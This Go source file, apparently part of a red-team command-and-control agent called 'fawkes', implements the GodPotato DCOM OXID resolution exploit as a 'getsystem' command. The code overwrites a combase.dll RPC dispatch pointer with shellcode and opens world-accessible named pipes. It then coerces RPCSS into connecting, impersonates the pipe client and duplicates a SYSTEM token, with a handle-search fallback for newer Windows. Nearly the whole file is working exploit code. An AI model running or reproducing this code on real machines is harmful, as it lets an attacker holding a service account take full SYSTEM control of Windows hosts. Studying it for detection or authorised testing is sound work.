//go:build windows
// +build windows

// getsystem_potato.go contains the main GodPotato DCOM OXID resolution exploit.
// The exploit is split across several files for maintainability:
//   - getsystem_potato_types.go: type definitions, constants, globals, API procs
//   - getsystem_potato_hook.go:  RPC hook mechanics and shellcode generation
//   - getsystem_potato_oxid.go:  OXID extraction, COM objects, OBJREF crafting
//   - getsystem_potato_token.go: SYSTEM token search fallback (Win11 23H2+)

package commands

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"runtime"
	"strings"
	"sync/atomic"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// getSystemViaPotato wraps the DCOM OXID exploit with a watchdog timer.
// If the exploit hangs (e.g., COM call deadlock), the watchdog returns
// diagnostic output indicating which phase was reached.
func getSystemViaPotato(oldIdentity string) structs.CommandResult {
	var phase int32
	resultCh := make(chan structs.CommandResult, 1)

	go func() {
		resultCh <- doPotatoExploit(oldIdentity, &phase)
	}()

	select {
	case result := <-resultCh:
		return result
	case <-time.After(25 * time.Second):
		return structs.CommandResult{
			Output: fmt.Sprintf("Potato technique timed out (25s watchdog).\nLast phase: %d\nhookCalled: %v\nparamCount: %d\npipe: %s",
				atomic.LoadInt32(&phase), potatoGlobal.hookCalled, potatoGlobal.paramCount, potatoGlobal.pipeName),
			Status:    "error",
			Completed: true,
		}
	}
}

// doPotatoExploit implements the actual GodPotato DCOM OXID resolution exploit.
// The phase counter is updated atomically so the watchdog can report progress.
func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
	// Phase 0: Check SeImpersonatePrivilege
	atomic.StoreInt32(phase, 0)
	if !checkPrivilege("SeImpersonatePrivilege") {
		return errorResult("SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).")
	}

	// Pin this goroutine to an OS thread — COM state is per-thread and
	// Go's scheduler can migrate goroutines between OS threads.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Phase 1: Initialize COM (loads combase.dll) and scan for ORCB RPC interface
	atomic.StoreInt32(phase, 1)
	procCoInitializeEx.Call(0, 0) // COINIT_MULTITHREADED = 0
	defer procCoUninitialize.Call()

	combaseBase, combaseSize, err := findModuleInfo("combase.dll")
	if err != nil {
		return errorf("Failed to find combase.dll: %v", err)
	}

	rpcIfaceAddr, err := scanForGUID(combaseBase, combaseSize, orcbGUID[:])
	if err != nil {
		return errorf("Failed to find ORCB RPC interface in combase.dll: %v", err)
	}

	// Phase 2: Parse RPC structures and locate UseProtSeq dispatch entry
	atomic.StoreInt32(phase, 2)
	rpcIface := (*rpcServerInterface)(unsafe.Pointer(rpcIfaceAddr))
	if rpcIface.DispatchTable == 0 {
		return errorResult("RPC_SERVER_INTERFACE dispatch table pointer is null")
	}

	dispTable := (*rpcDispatchTable)(unsafe.Pointer(rpcIface.DispatchTable))
	if dispTable.DispatchTable == 0 || dispTable.DispatchTableCount == 0 {
		return errorResult("RPC dispatch table is empty")
	}

	// UseProtSeq is at index 0 in the MIDL_SERVER_INFO dispatch table
	midlInfo := (*midlServerInfo)(unsafe.Pointer(rpcIface.InterpreterInfo))
	if midlInfo == nil || midlInfo.DispatchTable == 0 {
		return errorResult("MIDL_SERVER_INFO dispatch table is null")
	}

	// Read parameter count from MIDL format string (varies by Windows version)
	paramCount, paramErr := readUseProtSeqParamCount(midlInfo)
	if paramErr != nil {
		return errorf("Failed to read UseProtSeq param count: %v", paramErr)
	}
	potatoGlobal.paramCount = paramCount

	// Read the original UseProtSeq function pointer (index 0)
	useProtSeqSlot := midlInfo.DispatchTable
	origFunc := *(*uintptr)(unsafe.Pointer(useProtSeqSlot))
	potatoGlobal.origFuncPtr = origFunc

	// Phase 3: Extract our process's OXID BEFORE installing the hook.
	atomic.StoreInt32(phase, 3)
	// CreateObjrefMoniker triggers OXID registration which may call UseProtSeq.
	// We must do this with the original (unhooked) dispatch to avoid deadlocks.
	oxid, oid, ipid, oxidErr := extractProcessOXID()
	if oxidErr != nil {
		return errorf("Failed to extract process OXID: %v", oxidErr)
	}

	// Phase 4: Create named pipe server with multiple instances.
	// Multiple instances are needed because both our own COM runtime AND RPCSS
	// may connect simultaneously. With a single instance, accepting our own
	// connection first means RPCSS's connection is rejected.
	atomic.StoreInt32(phase, 4)
	var rndBytes [6]byte
	rand.Read(rndBytes[:])
	pipeUniqueName := hex.EncodeToString(rndBytes[:])
	pipeName := fmt.Sprintf(`\\.\pipe\%s\pipe\epmapper`, pipeUniqueName)
	potatoGlobal.pipeName = pipeName
	potatoGlobal.pipeUniqueName = pipeUniqueName
	potatoGlobal.tokenCaptured = false
	potatoGlobal.systemToken = 0
	potatoGlobal.hookCalled = false
	potatoGlobal.precomputedDSA = buildPipeDSA(pipeUniqueName)

	// Create the pipe with permissive DACL
	sd, sdErr := windows.NewSecurityDescriptor()
	if sdErr != nil {
		return errorf("NewSecurityDescriptor: %v", sdErr)
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return errorf("SetDACL: %v", err)
	}

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}

	// Create multiple pipe instances and start overlapped ConnectNamedPipe on each.
	// This ensures both our COM runtime and RPCSS can connect simultaneously.
	const numPipeInstances = 4
	type pipeInstance struct {
		handle     windows.Handle
		event      windows.Handle
		overlapped windows.Overlapped
	}
	pipes := make([]pipeInstance, numPipeInstances)
	pipeNamePtr, _ := windows.UTF16PtrFromString(pipeName)

	for i := 0; i < numPipeInstances; i++ {
		hPipe, _, pipeErr := procCreateNamedPipeW.Call(
			uintptr(unsafe.Pointer(pipeNamePtr)),
			PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
			0, // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT = 0x00
			PIPE_UNLIMITED_INSTANCES,
			PIPE_BUFFER_SIZE,
			PIPE_BUFFER_SIZE,
			0,
			uintptr(unsafe.Pointer(&sa)),
		)
		if hPipe == uintptr(windows.InvalidHandle) {
			// Clean up already-created pipes
			for j := 0; j < i; j++ {
				windows.CloseHandle(pipes[j].event)
				windows.CloseHandle(pipes[j].handle)
			}
			return errorf("CreateNamedPipe[%d](%s): %v", i, pipeName, pipeErr)
		}
		evt, _ := windows.CreateEvent(nil, 1, 0, nil)
		pipes[i] = pipeInstance{
			handle: windows.Handle(hPipe),
			event:  evt,
		}
		pipes[i].overlapped.HEvent = evt
		procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
	}
	defer func() {
		for i := 0; i < numPipeInstances; i++ {
			windows.CloseHandle(pipes[i].event)
			windows.CloseHandle(pipes[i].handle)
		}
	}()

	// Phase 5: Build native shellcode hook and install it.
	// We use raw x64 shellcode instead of syscall.NewCallback because Go's callback
	// trampoline crashes when called from the NDR interpreter's RPC dispatch thread.
	atomic.StoreInt32(phase, 5)

	// Allocate DSA on the process heap (RPC runtime will HeapFree it)
	dsaBufAddr, dsaErr := allocateDSAOnHeap(potatoGlobal.precomputedDSA)
	if dsaErr != nil {
		return errorf("Failed to allocate DSA on heap: %v", dsaErr)
	}

	hookAddr, hookErr := buildNativeHook(paramCount, dsaBufAddr)
	if hookErr != nil {
		return errorf("Failed to build hook shellcode: %v", hookErr)
	}

	// Make the dispatch table writable
	var oldProtect uint32
	err = windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return errorf("protection change on dispatch table: %v", err)
	}

	// Replace the function pointer
	*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = hookAddr

	// Restore protection and original function pointer on exit
	defer func() {
		*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = origFunc
		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
		if potatoGlobal.shellcodePage != 0 {
			windows.VirtualFree(potatoGlobal.shellcodePage, 0, windows.MEM_RELEASE)
			potatoGlobal.shellcodePage = 0
		}
	}()

	// Phase 6: Trigger OXID resolution via crafted OBJREF.
	atomic.StoreInt32(phase, 6)
	// Run in a goroutine because CoUnmarshalInterface can block if RPCSS hangs.
	// The trigger goroutine needs its own COM initialization and thread pinning.
	triggerDone := make(chan error, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		procCoInitializeEx.Call(0, 0)
		defer procCoUninitialize.Call()
		triggerDone <- triggerOXIDResolution(oxid, oid, ipid)
	}()

	// Wait for trigger to complete (5s) or proceed to pipe wait
	var triggerErr error
	select {
	case triggerErr = <-triggerDone:
		// trigger completed
	case <-time.After(5 * time.Second):
		triggerErr = fmt.Errorf("CoUnmarshalInterface blocked for >5s")
	}

	// Phase 7-8: Check all pipe instances for SYSTEM connection.
	// Both our COM runtime and RPCSS may have connected simultaneously to
	// different pipe instances. Check each instance with a connection.
	atomic.StoreInt32(phase, 7)

	systemSID, _ := windows.StringToSid("S-1-5-18") // NT AUTHORITY\SYSTEM
	var dupToken windows.Token
	var clientIdentity string
	gotSystem := false
	var clientIdentities []string

	// Build event array for WaitForMultipleObjects
	events := make([]windows.Handle, numPipeInstances)
	for i := 0; i < numPipeInstances; i++ {
		events[i] = pipes[i].event
	}

	// Wait for at least one connection, then check all that connected
	deadline := time.Now().Add(15 * time.Second)
	for !gotSystem && time.Now().Before(deadline) {
		// Wait for any pipe event (1 second timeout per poll)
		waitResult, _ := windows.WaitForSingleObject(events[0], 1000)
		_ = waitResult // just polling

		// Check all pipe instances for connections
		for i := 0; i < numPipeInstances; i++ {
			wr, _ := windows.WaitForSingleObject(pipes[i].event, 0)
			if wr != windows.WAIT_OBJECT_0 {
				continue // not connected yet
			}

			atomic.StoreInt32(phase, 8)
			hPipe := uintptr(pipes[i].handle)

			ret, _, _ := procImpersonateNamedPipeClient.Call(hPipe)
			if ret == 0 {
				procDisconnectNamedPipe.Call(hPipe)
				windows.ResetEvent(pipes[i].event)
				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
				continue
			}

			// Check if the client is SYSTEM
			var threadToken windows.Token
			err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
			if err != nil {
				err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
			}
			if err != nil {
				procRevertToSelf.Call()
				procDisconnectNamedPipe.Call(hPipe)
				windows.ResetEvent(pipes[i].event)
				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
				continue
			}

			tokenUser, tuErr := threadToken.GetTokenUser()
			if tuErr != nil {
				threadToken.Close()
				procRevertToSelf.Call()
				procDisconnectNamedPipe.Call(hPipe)
				windows.ResetEvent(pipes[i].event)
				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
				continue
			}

			isSystem := tokenUser.User.Sid.Equals(systemSID)
			clientIdentity, _ = GetCurrentIdentity()
			clientIdentities = append(clientIdentities, clientIdentity)

			if !isSystem {
				// Not SYSTEM — try token search fallback (GodPotato approach).
				// On Win11 23H2+, RPCSS runs as NETWORK SERVICE so the pipe
				// client won't be SYSTEM. Search for a SYSTEM token while
				// still impersonating the pipe client (may grant extra access).
				searchTok, searchInfo, searchErr := searchSystemTokenViaHandles()
				threadToken.Close()
				procRevertToSelf.Call()
				procDisconnectNamedPipe.Call(hPipe)

				if searchErr == nil && searchTok != 0 {
					dupToken = searchTok
					clientIdentity = fmt.Sprintf("token search: %s (pipe was %s)", searchInfo, clientIdentity)
					gotSystem = true
					break
				}

				// Token search failed — continue checking other pipe instances
				windows.ResetEvent(pipes[i].event)
				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
				continue
			}

			// Got SYSTEM directly from pipe! Duplicate to primary token
			err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
				windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
			if err != nil {
				err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
					windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
			}
			threadToken.Close()
			procRevertToSelf.Call()
			procDisconnectNamedPipe.Call(hPipe)

			if err != nil {
				return errorf("Connected as %s but DuplicateTokenEx: %v", clientIdentity, err)
			}

			gotSystem = true
			break
		}
	}

	if !gotSystem {
		hookStatus := "NOT called"
		if wasHookCalled() {
			hookStatus = "CALLED"
		}
		bindingStr := "ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`
		errMsg := fmt.Sprintf("Did not receive SYSTEM connection (15s timeout).\nPipe: %s\nBinding: %s\nHook: %s (paramCount=%d, ppdsaIndex=%d)\nDSA size: %d bytes\nDSA addr: %x\nOXID: %x\nOID: %x\nIPID: %x\nClients seen: %v",
			pipeName, bindingStr, hookStatus, paramCount, paramCount-2, len(potatoGlobal.precomputedDSA),
			dsaBufAddr, oxid, oid, ipid, clientIdentities)
		// Include diagnostic parameter dump
		if wasHookCalled() {
			diagParams := readDiagParams()
			errMsg += fmt.Sprintf("\nHook params: RCX=%x RDX=%x R8=%x R9=%x [RSP+0x28]=%x",
				diagParams[0], diagParams[1], diagParams[2], diagParams[3], diagParams[4])
		}
		if triggerErr != nil {
			errMsg += fmt.Sprintf("\nTrigger: %v", triggerErr)
		} else {
			errMsg += "\nTrigger: completed (no error)"
		}
		return errorResult(errMsg)
	}

	// Store SYSTEM token
	if setErr := SetIdentityToken(dupToken); setErr != nil {
		windows.CloseHandle(windows.Handle(dupToken))
		return errorf("Connected as SYSTEM but SetIdentityToken: %v", setErr)
	}

	newIdentity, _ := GetCurrentIdentity()

	// Record identity transition for history
	RecordIdentityTransition("getsystem", oldIdentity, newIdentity,
		fmt.Sprintf("DCOM/Potato pipe=%s", pipeName))

	var sb strings.Builder
	sb.WriteString("=== GETSYSTEM SUCCESS (DCOM/Potato) ===\n\n")
	sb.WriteString(fmt.Sprintf("Technique: DCOM OXID resolution hook (GodPotato)\n"))
	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipeName))
	sb.WriteString(fmt.Sprintf("ParamCount: %d\n", paramCount))
	if oldIdentity != "" {
		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
	}
	sb.WriteString(fmt.Sprintf("New: %s\n", newIdentity))
	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")

	return successResult(sb.String())
}
